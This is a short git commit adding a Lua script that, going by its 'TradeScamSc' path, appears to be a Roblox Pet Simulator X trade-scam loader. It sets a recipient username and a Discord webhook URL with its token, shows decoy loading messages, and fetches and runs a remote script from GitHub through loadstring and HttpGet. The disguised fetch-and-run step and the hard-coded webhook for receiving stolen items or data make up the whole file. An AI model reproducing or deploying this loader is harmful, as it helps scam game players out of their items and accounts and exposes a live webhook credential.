38a1d7cf78d2677ac47799251517054ee008644c
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-06-25 11:20:27 +0700

    .lua

---
+++ TradeScamSc/mainguesspsx/workbymoon/Fixed/.lua
@@ -0,0 +1,9 @@
+Username = "mxrcuszzzzz"
+WebHook = "https://discord.com/api/webhooks/1122380466402631710/6-r-X5KE1AI7kvZyHuT5KAfpqbvtXt1WCw4w8LLZ3HKogNYQFy5YLkAQ4WLfZ15pCe1R"
+
+_G.CustomScriptName = "Moon"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
